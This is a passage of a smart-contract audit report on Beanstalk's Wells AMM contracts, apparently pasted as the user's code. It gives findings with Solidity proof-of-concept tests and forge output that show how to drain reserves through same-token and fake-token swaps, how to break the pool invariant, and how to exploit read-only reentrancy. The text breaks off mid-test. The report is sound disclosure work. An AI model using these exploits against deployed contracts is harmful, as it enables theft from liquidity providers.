The following is my code:

------ FILE START car/reports_md/2023-03-13-beanstalk_wells_v0.1.md ------

---
title: Beanstalk Wells Initial Audit Report
author: Cyfrin.io
date: March 13, 2023
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.pdf} 
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries Beanstalk Wells Initial Audit Report\par}
    \vspace{1cm}
    {\Large Version 0.1\par}
    \vspace{2cm}
    {\Large\itshape Cyfrin.io\par}
    \vfill
    {\large \today\par}
\end{titlepage}

\maketitle

# Beanstalk Wells Initial Audit Report

Prepared by: [Cyfrin](https://cyfrin.io)
Lead Auditors: 

- [Giovanni Di Siena](https://twitter.com/giovannidisiena)

- [Hans](https://twitter.com/hansfriese)

Assisting Auditors:

- [Alex Roan](https://twitter.com/alexroan)

- [Patrick Collins](https://twitter.com/PatrickAlphaC)

# Table of Contents
- [Beanstalk Wells Initial Audit Report](#beanstalk-wells-initial-audit-report)
- [Table of Contents](#table-of-contents)
- [Disclaimer](#disclaimer)
- [Audit Details](#audit-details)
  - [Scope](#scope)
  - [Severity Criteria](#severity-criteria)
  - [Summary of Findings](#summary-of-findings)
- [High](#high)
  - [\[H-01\] Attackers can steal tokens and break the protocol's invariant](#h-01-attackers-can-steal-tokens-and-break-the-protocols-invariant)
    - [Description](#description)
    - [Proof of Concept](#proof-of-concept)
    - [Impact](#impact)
    - [Recommended Mitigation](#recommended-mitigation)
  - [\[H-02\] Attacker can steal reserves and subsequent liquidity deposits due to lack of input token validation](#h-02-attacker-can-steal-reserves-and-subsequent-liquidity-deposits-due-to-lack-of-input-token-validation)
    - [Description](#description-1)
    - [Proof of Concept](#proof-of-concept-1)
    - [Impact](#impact-1)
    - [Recommended Mitigation](#recommended-mitigation-1)
  - [\[H-03\] `removeLiquidity` logic is not correct for general Well functions other than ConstantProduct](#h-03-removeliquidity-logic-is-not-correct-for-general-well-functions-other-than-constantproduct)
    - [Description](#description-2)
    - [Proof of Concept](#proof-of-concept-2)
    - [Impact](#impact-2)
    - [Recommended Mitigation](#recommended-mitigation-2)
  - [\[H-04\] Read-only reentrancy](#h-04-read-only-reentrancy)
    - [Description](#description-3)
    - [Proof of Concept](#proof-of-concept-3)
    - [Impact](#impact-3)
    - [Recommended Mitigation](#recommended-mitigation-3)
- [Medium](#medium)
  - [\[M-01\] Insufficient support for fee-on-transfer ERC20 tokens](#m-01-insufficient-support-for-fee-on-transfer-erc20-tokens)
    - [Description](#description-4)
    - [Impact](#impact-4)
    - [Recommended Mitigation](#recommended-mitigation-4)
  - [\[M-02\] Some tokens revert on transfer of zero amount](#m-02-some-tokens-revert-on-transfer-of-zero-amount)
    - [Description](#description-5)
    - [Impact](#impact-5)
    - [Recommended Mitigation](#recommended-mitigation-5)
  - [\[M-03\] Need to make sure the tokens are unique for ImmutableTokens](#m-03-need-to-make-sure-the-tokens-are-unique-for-immutabletokens)
    - [Description](#description-6)
    - [Impact](#impact-6)
    - [Recommended Mitigation](#recommended-mitigation-6)
- [Low](#low)
  - [\[L-01\] Incorrect sload in LibBytes](#l-01-incorrect-sload-in-libbytes)
    - [Description](#description-7)
    - [Proof of Concept](#proof-of-concept-4)
    - [Impact](#impact-7)
    - [Recommended Mitigation](#recommended-mitigation-7)
- [QA](#qa)
  - [\[NC-01\] Non-standard storage packing](#nc-01-non-standard-storage-packing)
  - [\[NC-02\] EIP-1967 second pre-image best practice](#nc-02-eip-1967-second-pre-image-best-practice)
  - [\[NC-03\] Remove experimental ABIEncoderV2 pragma](#nc-03-remove-experimental-abiencoderv2-pragma)
  - [\[NC-04\] Inconsistent use of decimal/hex notation in inline assembly](#nc-04-inconsistent-use-of-decimalhex-notation-in-inline-assembly)
  - [\[NC-05\] Unused variables, imports and errors](#nc-05-unused-variables-imports-and-errors)
  - [\[NC-06\] Inconsistency in LibMath comments](#nc-06-inconsistency-in-libmath-comments)
  - [\[NC-07\] FIXME and TODO comments](#nc-07-fixme-and-todo-comments)
  - [\[NC-08\] Use correct NatSpec tags](#nc-08-use-correct-natspec-tags)
  - [\[NC-09\] Format for readability](#nc-09-format-for-readability)
  - [\[NC-10\] Spelling errors](#nc-10-spelling-errors)
  - [\[G-1\] Simplify modulo operations](#g-1-simplify-modulo-operations)
  - [\[G-2\] Branchless optimization](#g-2-branchless-optimization)


# Disclaimer

The Cyfrin team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed to two weeks, and the review of the code is solely on the security aspects of the solidity implementation of the contracts. 

# Audit Details

**The findings described in this document correspond the following commit hash:**
```
7c498215f843620cb24ec5bbf978c6495f6e5fe4
```
**Beanstalk Farms informed Cyfrin that this was not the final commit hash to be audited. On the 10th of March 2023, Beanstalk Farms provided Cyfrin with a new commit hash, the findings of which will be represented in a separate audit report.**

## Scope 

Between the 7th of Februrary 2023 and the 24th of February 2023, the Cyfrin team conducted an audit on the smart contracts in the [Wells](https://github.com/BeanstalkFarms/Wells) repository from Beanstalk Farms, at commit hash `7c498215f843620cb24ec5bbf978c6495f6e5fe4`.

## Severity Criteria

- High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).
- Medium: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.
- Low: Low impact and low/medium likelihood events where assets are not at risk (or a trivia amount of assets are), state handling might be off, functions are incorrect as to natspec, issues with comments, etc. 
- QA / Non-Critial: A non-security issue, like a suggested code improvement, a comment, a renamed variable, etc. Auditors did not attempt to find an exhaustive list of these.  
- Gas: Gas saving / performance suggestions. Auditors did not attempt to find an exhaustive list of these.  

## Summary of Findings

# High

## [H-01] Attackers can steal tokens and break the protocol's invariant

### Description

The protocol exposes an external function `Well::swapFrom()` which allows any caller to swap `fromToken` to `toToken`.
The function `Well::_getIJ()` is used to get the index of the `fromToken` and `toToken` in the Well's `tokens`.
But the function `Well::_getIJ` is not implemented correctly.

```solidity
Well.sol
566:     function _getIJ(//@audit returns (i, 0) if iToken==jToken while it should return (i, i)
567:         IERC20[] memory _tokens,
568:         IERC20 iToken,
569:         IERC20 jToken
570:     ) internal pure returns (uint i, uint j) {
571:         for (uint k; k < _tokens.length; ++k) {
572:             if (iToken == _tokens[k]) i = k;
573:             else if (jToken == _tokens[k]) j = k;
574:         }
575:     }
576:
```

When `iToken==jToken`, `_getIJ()` returns `(i, 0)` while it is supposed to return `(i, i)`.
It should revert if `iToken==jToken` because swapping from a token to the same token does not make sense.
Attackers can abuse this vulnerability to steal tokens free and break the protocol's core invariant.

### Proof of Concept

Assume a Well with two tokens `t0, t1` is deployed with `ConstantProduct2.sol` as the Well function.

1. The protocol is in a state of `(400 ether, 100 ether)` (`reserve0, reserve1`).
2. An attacker Alice calls `swapFrom(t1, t1, 100 ether, 0)`.
3. At [L148](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/Well.sol#L148), `(1, 0)` is returned.
4. The `amountOut` is calculated to `200 ether` and the pool's reserve state becomes `(200 ether, 200 ether)` while the pool's actual balances are `(400 ether, 0 ether)` after swap.
5. Alice took `100 ether` of token `t1` without cost and the pool's stored reserve values are now more than the actual balances.

The following code snippet is a test case to show this exploit scenario.

```solidity
    function test_exploitFromTokenEqualToToken_400_100_400() prank(user) public {
        uint[] memory well1Amounts = new uint[](2);
        well1Amounts[0] = 400 * 1e18;
        well1Amounts[1] = 100 * 1e18;
        uint256 lpAmountOut = well1.addLiquidity(well1Amounts, 400 * 1e18, address(this));
        emit log_named_uint("lpAmountOut", lpAmountOut);

        Balances memory userBalancesBefore = getBalances(user, well1);
        uint[] memory userBalances = new uint[](3);
        userBalances[0] = userBalancesBefore.tokens[0];
        userBalances[1] = userBalancesBefore.tokens[1];
        userBalances[2] = userBalancesBefore.lp;
        Balances memory wellBalancesBefore = getBalances(address(well1), well1);
        uint[] memory well1Balances = new uint[](3);
        well1Balances[0] = wellBalancesBefore.tokens[0];
        well1Balances[1] = wellBalancesBefore.tokens[1];
        well1Balances[2] = wellBalancesBefore.lpSupply;

        assertEq(lpAmountOut, well1Balances[2]);

        emit log_named_array("userBalancesBefore", userBalances);
        emit log_named_array("wellBalancesBefore", well1Balances);
        emit log_named_array("reservesBefore", well1.getReserves());

        vm.stopPrank();
        approveMaxTokens(user, address(well1));
        changePrank(user);

        uint256 swapAmountOut = well1.swapFrom(tokens[1], tokens[1], 100 * 1e18, 0, user);
        emit log_named_uint("swapAmountOut", swapAmountOut);

        Balances memory userBalancesAfter = getBalances(user, well1);
        userBalances[0] = userBalancesAfter.tokens[0];
        userBalances[1] = userBalancesAfter.tokens[1];
        userBalances[2] = userBalancesAfter.lp;
        Balances memory well1BalancesAfter = getBalances(address(well1), well1);
        well1Balances[0] = well1BalancesAfter.tokens[0];
        well1Balances[1] = well1BalancesAfter.tokens[1];
        well1Balances[2] = well1BalancesAfter.lpSupply;

        emit log_named_array("userBalancesAfter", userBalances);
        emit log_named_array("well1BalancesAfter", well1Balances);
        emit log_named_array("reservesAfter", well1.getReserves());

        assertEq(userBalances[0], userBalancesBefore.tokens[0]);
        assertEq(userBalances[1], userBalancesBefore.tokens[1] + swapAmountOut/2);
    }
```

The output is shown below.

```
forge test -vv --match-test test_exploitFromTokenEqualToToken_400_100_400

[] Compiling...
No files changed, compilation skipped

Running 1 test for test/Exploit.t.sol:ExploitTest
[PASS] test_exploitFromTokenEqualToToken_400_100_400() (gas: 233054)
Logs:
  lpAmountOut: 400000000000000000000000000000
  userBalancesBefore: [600000000000000000000, 900000000000000000000, 0]
  wellBalancesBefore: [400000000000000000000, 100000000000000000000, 400000000000000000000000000000]
  reservesBefore: [400000000000000000000, 100000000000000000000]
  swapAmountOut: 200000000000000000000
  userBalancesAfter: [600000000000000000000, 1000000000000000000000, 0]
  well1BalancesAfter: [400000000000000000000, 0, 400000000000000000000000000000]
  reservesAfter: [200000000000000000000, 200000000000000000000]

Test result: ok. 1 passed; 0 failed; finished in 2.52ms
```

### Impact

The protocol aims for a generalized constant function AMM (CFAMM) and the core invariant of the protocol is there are always more reserved tokens than the actual token balance (`reserves[i] >= tokens[i].balanceOf(well) for all i`).
The incorrect implementation of `_getIJ()` allows attackers to break this invariant and extract value.
Because this exploit does not require any additional assumptions, we evaluate the severity to HIGH.

### Recommended Mitigation

- Add a sanity check to revert if `fromToken==toToken` in the function `Well::swapFrom()` and `Well::swapTo()` .
- Add a sanity check to revert if `iToken==jToken` in the function `Well::_getIJ()` assuming this internal function is not supposed to used with same tokens.
- We strongly recommend adding a check in the function `Well::_executeSwap()` to make sure the Well has enough reserves on every transaction.
  This will prevent using weird ERC20 tokens as Well tokens, especially double-entrypoint tokens.
  [Double-entrypoint](https://github.com/d-xo/weird-erc20#multiple-token-addresses) ERC20 tokens can cause the similar issue described above.

## [H-02] Attacker can steal reserves and subsequent liquidity deposits due to lack of input token validation

### Description

The protocol exposes an external function `Well::swapFrom()` which allows any caller to swap `fromToken` to `toToken`.
If one of the parameters `fromToken/toToken` is not in `_tokens`, this causes similar issues in `_getIJ` with an index `i/j` being returned as zero.
It appears you can specify a garbage `fromToken` to swap for `toToken` and effectively receive them for free.
Reserves are `updated` but `_executeSwap` performs the transfer on unvalidated user input, swapping the garbage token but updating the `_tokens[0]` reserve.
Whilst similar to the H-01 case where `fromToken == toToken`, this is a separate vulnerability.

### Proof of Concept

Beliw is a test case to show this exploit scenario.
The attacker can deploy his own garbage token and call `Well::swapFrom(garbageToken, tokens[1])` that drains the `tokens[0]` balance of the Well.
Note that the similar exploit is also possible for `Well::swapTo()`.

```solidity
function test_exploitGarbageFromToken() prank(user) public {
    // this is the maximum that can be sent to the well before hitting ByteStorage: too large
    uint256 inAmount = type(uint128).max - tokens[0].balanceOf(address(well));

    IERC20 garbageToken = IERC20(new MockToken("GarbageToken", "GTKN", 18));
    MockToken(address(garbageToken)).mint(user, inAmount);

    address victim = makeAddr("victim");
    vm.stopPrank();
    approveMaxTokens(victim, address(well));
    mintTokens(victim, 1000 * 1e18);

    changePrank(user);
    garbageToken.approve(address(well), type(uint256).max);

    Balances memory userBalancesBefore = getBalances(user);
    uint[] memory userBalances = new uint[](3);
    userBalances[0] = userBalancesBefore.tokens[0];
    userBalances[1] = userBalancesBefore.tokens[1];
    userBalances[2] = userBalancesBefore.lp;
    Balances memory wellBalancesBefore = getBalances(address(well));
    uint[] memory wellBalances = new uint[](3);
    wellBalances[0] = wellBalancesBefore.tokens[0];
    wellBalances[1] = wellBalancesBefore.tokens[1];
    wellBalances[2] = wellBalancesBefore.lpSupply;

    emit log_named_array("userBalancesBefore", userBalances);
    emit log_named_array("wellBalancesBefore", wellBalances);
    emit log_named_array("reserves", well.getReserves());

    uint256 swapAmountOut = well.swapFrom(garbageToken, tokens[1], inAmount, 0, user);
    emit log_named_uint("swapAmountOut", swapAmountOut);

    Balances memory userBalancesAfter = getBalances(user);
    userBalances[0] = userBalancesAfter.tokens[0];
    userBalances[1] = userBalancesAfter.tokens[1];
    userBalances[2] = userBalancesAfter.lp;
    Balances memory wellBalancesAfter = getBalances(address(well));
    wellBalances[0] = wellBalancesAfter.tokens[0];
    wellBalances[1] = wellBalancesAfter.tokens[1];
    wellBalances[2] = wellBalancesAfter.lpSupply;

    emit log_named_array("userBalancesAfter", userBalances);
    emit log_named_array("wellBalancesAfter", wellBalances);
    emit log_named_array("reservesAfter", well.getReserves());

    assertEq(userBalances[0], userBalancesBefore.tokens[0]);
    assertEq(userBalances[1], userBalancesBefore.tokens[1] + swapAmountOut);
}
```

The output is shown below.
Note how the protocol's reserve values are changed while its actual balances are almost drained to zero.

```
forge test -vv --match-test test_exploitGarbageFromToken
[] Compiling...
No files changed, compilation skipped

Running 1 test for test/Exploit.t.sol:ExploitTest
[PASS] test_exploitGarbageFromToken() (gas: 1335961)
Logs:
  userBalancesBefore: [1000000000000000000000, 1000000000000000000000, 0]
  wellBalancesBefore: [1000000000000000000000, 1000000000000000000000, 2000000000000000000000000000000]
  reserves: [1000000000000000000000, 1000000000000000000000]
  swapAmountOut: 999999999999999997061
  userBalancesAfter: [1000000000000000000000, 1999999999999999997061, 0]
  wellBalancesAfter: [1000000000000000000000, 2939, 2000000000000000000000000000000]
  reservesAfter: [340282366920938463463374607431768211455, 2939]

Test result: ok. 1 passed; 0 failed; finished in 2.65ms
```

### Impact

The insufficient sanity check on the input tokens of `swapFrom()`(and `swapTo()`) allows attackers to extract tokens and break the protocol's invariant.
Because this exploit does not require any additional assumptions, we evaluate the severity to HIGH.

### Recommended Mitigation

- Add a sanity check to revert if either `iToken` or `jToken` is not found in the `_tokens` array.
- We also strongly recommend adding a check in the function `Well::_executeSwap()` to make sure the Well has enough reserves on every transaction.

## [H-03] `removeLiquidity` logic is not correct for general Well functions other than ConstantProduct

### Description

The protocol aims for a generalized permission-less CFAMM (constant function AMM) where various Well functions can be used.

At the moment, only constant product Well function types are defined but we assume support for more generalized Well functions are intended.

The current implementation of `removeLiquidity()` and `getRemoveLiquidityOut()` assumes a special condition in the Well function.
It assumes linearity while getting the output token amount from the LP token amount to withdraw.

This holds well for the constant product type Well as we can see below.
If we denote the total supply of LP tokens as $L$, the reserve values for the two tokens as $x, y$, the invariant is $L^2=4xy$ for the `ConstantProduct2`.
When we remove liquidity of amount $l$, the output amounts are calculated as $\Delta x=\frac{l}{L}x, \Delta y=\frac{l}{L}y$.
It is straightforward to verify that the invariant still holds after withdrawl, i.e., $(L-l)^2=(x-\Delta x)(y-\Delta y)$.

But in general, this kind of _linearity_ is not guaranteed to hold.

Recently non-linear (quadratic) function AMMs are being introduced by some new protocols. (See Numoen : https://numoen.gitbook.io/numoen/)
If we use this kind of Well function, the current calculation of `tokenAmountsOut` will break the Well's invariant.

For your information, the Numoen protocol checks the protocol's invariant (the constant function itself) after every transaction.

### Proof of Concept

We wrote a test case with the quadratic Well function used by Numoen.

```solidity
// QuadraticWell.sol

/**
 * SPDX-License-Identifier: MIT
 **/

pragma solidity ^0.8.17;

import "src/interfaces/IWellFunction.sol";
import "src/libraries/LibMath.sol";

contract QuadraticWell is IWellFunction {
    using LibMath for uint;

    uint constant PRECISION = 1e18;//@audit-info assume 1:1 upperbound for this well
    uint constant PRICE_BOUND = 1e18;

    /// @dev s = b_0 - (p_1^2 - b_1/2)^2
    function calcLpTokenSupply(
        uint[] calldata reserves,
        bytes calldata
    ) external override pure returns (uint lpTokenSupply) {
        uint delta = PRICE_BOUND - reserves[1] / 2;
        lpTokenSupply = reserves[0] - delta*delta/PRECISION ;
    }

    /// @dev b_0 = s + (p_1^2 - b_1/2)^2
    /// @dev b_1 = (p_1^2 - (b_0 - s)^(1/2))*2
    function calcReserve(
        uint[] calldata reserves,
        uint j,
        uint lpTokenSupply,
        bytes calldata
    ) external override pure returns (uint reserve) {

        if(j == 0)
        {
            uint delta = PRICE_BOUND*PRICE_BOUND - PRECISION*reserves[1]/2;
            return lpTokenSupply + delta*delta /PRECISION/PRECISION/PRECISION;
        }
        else {
            uint delta = (reserves[0] - lpTokenSupply)*PRECISION;
            return (PRICE_BOUND*PRICE_BOUND - delta.sqrt()*PRECISION)*2/PRECISION;
        }
    }

    function name() external override pure returns (string memory) {
        return "QuadraticWell";
    }

    function symbol() external override pure returns (string memory) {
        return "QW";
    }
}

// NOTE: Put in Exploit.t.sol
function test_exploitQuadraticWellAddRemoveLiquidity() public {
    MockQuadraticWell quadraticWell = new MockQuadraticWell();
    Call memory _wellFunction = Call(address(quadraticWell), "");
    Well well2 = Well(auger.bore("Well2", "WELL2", tokens, _wellFunction, pumps));

    approveMaxTokens(user, address(well2));
    uint[] memory amounts = new uint[](tokens.length);
    changePrank(user);

    // initial status 1:1
    amounts[0] = 1e18;
    amounts[1] = 1e18;
    well2.addLiquidity(amounts, 0, user); // state: [1 ether, 1 ether, 0.75 ether]

    Balances memory userBalances1 = getBalances(user, well2);
    uint[] memory userBalances = new uint[](3);
    userBalances[0] = userBalances1.tokens[0];
    userBalances[1] = userBalances1.tokens[1];
    userBalances[2] = userBalances1.lp;
    Balances memory wellBalances1 = getBalances(address(well2), well2);
    uint[] memory wellBalances = new uint[](3);
    wellBalances[0] = wellBalances1.tokens[0];
    wellBalances[1] = wellBalances1.tokens[1];
    wellBalances[2] = wellBalances1.lpSupply;
    amounts[0] = wellBalances[0];
    amounts[1] = wellBalances[1];

    emit log_named_array("userBalances1", userBalances);
    emit log_named_array("wellBalances1", wellBalances);
    emit log_named_int("invariant", quadraticWell.wellInvariant(wellBalances[2], amounts));

    // addLiquidity
    amounts[0] = 2e18;
    amounts[1] = 1e18;
    well2.addLiquidity(amounts, 0, user); // state: [3 ether, 2 ether, 3 ether]

    Balances memory userBalances2 = getBalances(user, well2);
    userBalances[0] = userBalances2.tokens[0];
    userBalances[1] = userBalances2.tokens[1];
    userBalances[2] = userBalances2.lp;
    Balances memory wellBalances2 = getBalances(address(well2), well2);
    wellBalances[0] = wellBalances2.tokens[0];
    wellBalances[1] = wellBalances2.tokens[1];
    wellBalances[2] = wellBalances2.lpSupply;
    amounts[0] = wellBalances[0];
    amounts[1] = wellBalances[1];

    emit log_named_array("userBalances2", userBalances);
    emit log_named_array("wellBalances2", wellBalances);
    emit log_named_int("invariant", quadraticWell.wellInvariant(wellBalances[2], amounts));

    // removeLiquidity
    amounts[0] = 0;
    amounts[1] = 0;
    well2.removeLiquidity(userBalances[2], amounts, user);

    Balances memory userBalances3 = getBalances(user, well2);
    userBalances[0] = userBalances3.tokens[0];
    userBalances[1] = userBalances3.tokens[1];
    userBalances[2] = userBalances3.lp;
    Balances memory wellBalances3 = getBalances(address(well2), well2);
    wellBalances[0] = wellBalances3.tokens[0];
    wellBalances[1] = wellBalances3.tokens[1];
    wellBalances[2] = wellBalances3.lpSupply;
    amounts[0] = wellBalances[0];
    amounts[1] = wellBalances[1];

    emit log_named_array("userBalances3", userBalances);
    emit log_named_array("wellBalances3", wellBalances);
    emit log_named_int("invariant", quadraticWell.wellInvariant(wellBalances[2], amounts)); // @audit-info well's invariant is broken via normal removeLiquidity
}
```

The output is shown below.
We calculated `invariant` of the Well after transactions.
While it is supposed to stay at zero, it is broken after removing liquidity.
Note that the invariant stayed at zero on adding liquidity, this is because the protocol explicitly calculates the resulting liquidity token supply using the Well function.
But on removing liquidity, the output amounts are calculated in a fixed way without using the Well function and it breaks the invariant.

```
forge test -vv --match-test test_exploitQuadraticWellAddRemoveLiquidity

[PASS] test_exploitQuadraticWellAddRemoveLiquidity() (gas: 4462244)
Logs:
  userBalances1: [999000000000000000000, 999000000000000000000, 750000000000000000]
  wellBalances1: [1000000000000000000, 1000000000000000000, 750000000000000000]
  invariant: 0
  userBalances2: [997000000000000000000, 998000000000000000000, 3000000000000000000]
  wellBalances2: [3000000000000000000, 2000000000000000000, 3000000000000000000]
  invariant: 0
  userBalances3: [1000000000000000000000, 1000000000000000000000, 0]
  wellBalances3: [0, 0, 0]
  invariant: 1000000000000000000

Test result: ok. 1 passed; 0 failed; finished in 5.14ms
```

### Impact

The current `removeLiquidity()` logic assumes specific conditions on the Well function (specifically, some sort of linearity).
This limits the generalization of the protocol, opposed to its original purpose.
Because this will lead to loss of funds for the liquidity providers for general Well functions, we evaluate the severity to HIGH.

### Recommended Mitigation

We believe that it is not possible to cover all kinds of Well functions without adding some additional functions in the interface `IWellFunction`.
We recommend adding a new function in the `IWellFunction` interface, possibly in the form of `function calcWithdrawFromLp(uint lpTokenToBurn) returns (uint reserve)`.

The output token amount can be calculated using the newly added function.

## [H-04] Read-only reentrancy

### Description

The current implementation is vulnerable to read-only reentrancy, especially in the function [removeLiquidity](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/Well.sol#L296).
The implementation does not conform to the [CEI pattern](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html) because it sets the new reserve values after sending out the tokens.
Because of the `nonReentrant` modifier, it is not a direct risk to the protocol itself but this is still vulnerable to [read-only reentrancy](https://chainsecurity.com/curve-lp-oracle-manipulation-post-mortem/).

Malicious attackers can deploy Wells with ERC777 tokens and exploit this vulnerability.
This will be critical if the Wells are going to be extended with some kind of price functions.
The third-party protocols that integrates Wells will be at risk.

### Proof of Concept

Below is a test case to show the existing read-only reentrancy.

```solidity
// MockCallbackRecipient.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {console} from "forge-std/Test.sol";

contract MockCallbackRecipient {
    fallback() external payable {
        console.log("here");
        (bool success, bytes memory result) = msg.sender.call(abi.encodeWithSignature("getReserves()"));
        if (success) {
            uint256[] memory reserves = abi.decode(result, (uint256[]));
            console.log("read-only-reentrancy beforeTokenTransfer reserves[0]: %s", reserves[0]);
            console.log("read-only-reentrancy beforeTokenTransfer reserves[1]: %s", reserves[1]);
        }
    }
}

// NOTE: Put in Exploit.t.sol
function test_exploitReadOnlyReentrancyRemoveLiquidityCallbackToken() public {
    IERC20 callbackToken = IERC20(new MockCallbackToken("CallbackToken", "CBTKN", 18));
    MockToken(address(callbackToken)).mint(user, 1000e18);
    IERC20[] memory _tokens = new IERC20[](2);
    _tokens[0] = callbackToken;
    _tokens[1] = tokens[1];

    vm.stopPrank();
    Well well2 = Well(auger.bore("Well2", "WELL2", _tokens, wellFunction, pumps));
    approveMaxTokens(user, address(well2));

    uint[] memory amounts = new uint[](2);
    amounts[0] = 100 * 1e18;
    amounts[1] = 100 * 1e18;

    changePrank(user);
    callbackToken.approve(address(well2), type(uint).max);
    uint256 lpAmountOut = well2.addLiquidity(amounts, 0, user);

    well2.removeLiquidity(lpAmountOut, amounts, user);
}
```

The output is shown below.

```
forge test -vv --match-test test_exploitReadOnlyReentrancyRemoveLiquidityCallbackToken

[PASS] test_exploitReadOnlyReentrancyRemoveLiquidityCallbackToken() (gas: 5290876)
Logs:
  read-only-reentrancy beforeTokenTransfer reserves[0]: 0
  read-only-reentrancy beforeTokenTransfer reserves[1]: 0
  read-only-reentrancy afterTokenTransfer reserves[0]: 0
  read-only-reentrancy afterTokenTransfer reserves[1]: 0
  read-only-reentrancy beforeTokenTransfer reserves[0]: 100000000000000000000
  read-only-reentrancy beforeTokenTransfer reserves[1]: 100000000000000000000
  read-only-reentrancy afterTokenTransfer reserves[0]: 100000000000000000000
  read-only-reentrancy afterTokenTransfer reserves[1]: 100000000000000000000

Test result: ok. 1 passed; 0 failed; finished in 3.66ms
```

### Impact

Although this is not a direct risk to the protocol itself as it is, this can lead to a critical issue in the future.
We evaluate the severity to HIGH.

### Recommended Mitigation

Implement the CEI pattern in relevant functions.
For example, the function `Well::removeLiquidity` can be modified as below.

```solidity
function removeLiquidity(
    uint lpAmountIn,
    uint[] calldata minTokenAmountsOut,
    address recipient
) external nonReentrant returns (uint[] memory tokenAmountsOut) {
    IERC20[] memory _tokens = tokens();
    uint[] memory reserves = _updatePumps(_tokens.length);
    uint lpTokenSupply = totalSupply();

    tokenAmountsOut = new uint[](_tokens.length);
    _burn(msg.sender, lpAmountIn);

    _setReserves(reserves); // @audit CEI pattern

    for (uint i; i < _tokens.length; ++i) {
        tokenAmountsOut[i] = (lpAmountIn * reserves[i]) / lpTokenSupply;
        require(
            tokenAmountsOut[i] >= minTokenAmountsOut[i],
            "Well: slippage"
        );
        _tokens[i].safeTransfer(recipient, tokenAmountsOut[i]);
        reserves[i] = reserves[i] - tokenAmountsOut[i];
    }

    emit RemoveLiquidity(lpAmountIn, tokenAmountsOut);
}
```


# Medium

## [M-01] Insufficient support for fee-on-transfer ERC20 tokens

### Description

The Well does not rely on the `balanceOf()` function from ERC20 to retrieve current reserve balances.
This is a good design choice.
Reserves values stored in the protocol should be equal to or less than the actual balance.

The current implementation assumes `safeTransfer()` will always increase the actual balance equal to the amount specified.

But some [ERC20 tokens] (https://github.com/d-xo/weird-erc20 ) take fees on transfer and the actual balance increase can be less than the amount specified. ([Well.sol #L422](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/Well.sol#L422))
This breaks the protocol's invariant.

### Impact

Because this vulnerability is dependent on the tokens, we evaluate the severity to MEDIUM.

### Recommended Mitigation

- If the protocol does not intend to support these kinds of tokens, prevent them by checking the actual balance increase after calling safeTransfer.
- If the protocol wants to support any kind of ERC20 tokens, use a hook method so that the caller can decide the sending amount and check the balance increase amount afterwards.

## [M-02] Some tokens revert on transfer of zero amount

### Description

Well protocol intends to be used with various ERC20 tokens.
Some ERC20 tokens revert on transferring zero amount and it is recommended to transfer only when the amount is positive.([Ref](https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers))
In several places, the current implementation does not check the transfer amount and calls `safeTransferFrom()` function.
([removeLiquidity](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/Well.sol#L313), [removeLiquidityImbalanced](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/Well.sol#L422))

### Impact

For some ERC20 tokens, the protocol's important functions (e.g. `removeLiquidity`) would revert and this can lead to insolvency.
We evaluate the severity to MEDIUM.

### Recommended Mitigation

Check the transfer amount to be positive before calling transfer functions.

## [M-03] Need to make sure the tokens are unique for ImmutableTokens

### Description

The current implementation does not enforce uniqueness in the `_tokens` of `ImmutableTokens`.

Assuming `_tokens[0]=_tokens[1]`.
An honest liquidity provider calls `addLiquidity([1 ether,1 ether], 200 ether, address)`, resulting in the reserves being `(1 ether, 1 ether)`.
At this point, anyone can call the function `skim()` and take 1 ether out.

A malicious Well creator can abuse this to make a trap and takes profit from honest liquidity providers.

### Impact

Assuming normal liquidity providers are smart enough to check the tokens before sending funds, the likelihood is low, hence we evaluate the severity to MEDIUM.

### Recommended Mitigation

Enforce uniqueness of the array `_tokens` in `ImmutableTokens`.
This can also be done in the function `ImmutableTokens::getTokenFromList()`.

# Low 

## [L-01] Incorrect sload in LibBytes

### Description

The function `storeUint128` in `LibBytes` intends to pack uint128 `reserves` starting at the given slot but will actually overwrite the final slot if [storing an odd number of reserves](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/libraries/LibBytes.sol#L78). It is currently only ever called in [`Well::_setReserves`](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/Well.sol#L514) which takes as input the result of `Well::_updatePumps` which itself always takes `_tokens.length` as argument. Hence, in the case of an odd number of tokens, the final 128 bits in the slot are never accessed regardless of the error. However, there may be a case in which the library is used by other implementations, setting a variable number of reserves at any one time, rather than always acting on the entire tokens length, which may inadvertently overwrite the final reserve to zero.

### Proof of Concept

The following test case demonstrates this issue more clearly:

```solidity
// NOTE: Add to LibBytes.t.sol
function test_exploitStoreAndRead() public {
    // Write to storage slot to demonstrate overwriting existing values
    // In this case, 420 will be stored in the lower 128 bits of the last slot
    bytes32 slot = RESERVES_STORAGE_SLOT;
    uint256 maxI = (NUM_RESERVES_MAX - 1) / 2;
    uint256 storeValue = 420;
    assembly {
        sstore(add(slot, mul(maxI, 32)), storeValue)
    }

    // Read reserves and assert the final reserve is 420
    uint[] memory reservesBefore = LibBytes.readUint128(RESERVES_STORAGE_SLOT, NUM_RESERVES_MAX);
    emit log_named_array("reservesBefore", reservesBefore);

    // Set up reserves to store, but only up to NUM_RESERVES_MAX - 1 as we have already stored a value in the last 128 bits of the last slot
    uint[] memory reserves = new uint[](NUM_RESERVES_MAX - 1);
    for (uint i = 1; i < NUM_RESERVES_MAX; i++) {
